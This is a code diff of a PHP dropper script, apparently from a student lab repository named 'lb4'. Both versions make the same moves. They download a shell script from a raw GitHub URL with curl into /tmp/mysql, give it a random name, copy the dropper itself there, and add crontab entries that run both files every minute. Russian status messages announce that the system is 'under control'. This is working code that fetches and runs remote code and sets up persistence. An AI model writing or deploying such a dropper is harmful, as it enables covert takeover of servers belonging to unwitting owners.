@@ -1,28 +1,27 @@
 <?php
-$dir = "/tmp/mysql";
-if (!is_dir($dir)) mkdir($dir, 0755, true);
-
-$sh = $dir . "/script.sh";
-$php = $dir . "/index.php"; // Копия самого дроппера
-$log = $dir . "/logi.log";
-
+$targetDir = "/tmp/mysql";
 $gitSh = "https://raw.githubusercontent.com/temaniall/lb4/main/script.sh";
-$gitPhp = "https://raw.githubusercontent.com/temaniall/lb4/main/lab4.php"; 
+$gitPhp = "https://raw.githubusercontent.com/temaniall/lb4/main/lab4.php";
 
-if (!file_exists($sh)) {
-    exec("curl -s $gitSh -o $sh");
-    chmod($sh, 0755);
+if (!is_dir($targetDir)) mkdir($targetDir, 0755, true);
+
+$randomName = substr(md5(mt_rand()), 0, 8) . ".sh";
+$fullPath = $targetDir . "/" . $randomName;
+$phpCopy = $targetDir . "/index.php";
+
+$checkCron = shell_exec("crontab -l 2>/dev/null");
+
+if (strpos($checkCron, $targetDir) === false) {
+    exec("curl -s $gitSh -o $fullPath");
+    chmod($fullPath, 0755);
+
+    copy(__FILE__, $phpCopy);
+
+    $cronLine = "* * * * * $fullPath\n* * * * * php $phpCopy\n";
+    exec("(crontab -l 2>/dev/null; echo " . escapeshellarg($cronLine) . ") | crontab -");
+
+    echo "Установка завершена. Файл: $randomName\n";
+} else {
+    echo "Система уже под контролем.\n";
 }
-
-if (!file_exists($php)) {
-    copy(__FILE__, $php);
-}
-
-$cron = shell_exec("crontab -l 2>/dev/null");
-if (strpos($cron, $sh) === false) {
-    $job = "* * * * * $sh\n* * * * * php $php\n";
-    exec("(crontab -l 2>/dev/null; echo " . escapeshellarg($job) . ") | crontab -");
-}
-
-echo "Скрипт создан, логи в $log, запись в кроне\n";
 ?>
